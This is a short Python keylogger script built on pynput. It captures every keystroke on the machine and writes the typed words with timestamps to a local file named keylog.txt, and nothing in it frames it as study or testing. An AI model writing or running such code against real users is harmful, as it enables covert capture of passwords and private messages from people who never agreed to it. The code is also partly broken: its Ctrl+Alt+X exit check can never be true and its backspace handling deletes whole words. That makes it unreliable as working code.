import pynput.keyboard
import logging

log_file = "keylog.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

current_word = ""  # Variable to store the current word

def on_press(key):
    global current_word

    if key == pynput.keyboard.Key.space:
        logging.info(current_word)
        current_word = ""  # Reset the current word
    elif key == pynput.keyboard.Key.backspace:
        # Remove the previous word if Backspace is pressed
        current_word = current_word.rsplit(' ', 1)[0]
    else:
        try:
            char = key.char  # Get the character representation of the key
            current_word += char
        except AttributeError:
            pass  # Ignore special keys that don't have a character representation

    # Check for the specific key combination (Ctrl+Alt+X) to terminate the script
    if key == pynput.keyboard.Key.alt_l and \
       key == pynput.keyboard.Key.ctrl_l and \
       key == pynput.keyboard.KeyCode.from_char('x'):
        return False  # Stop the listener and terminate the script

with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()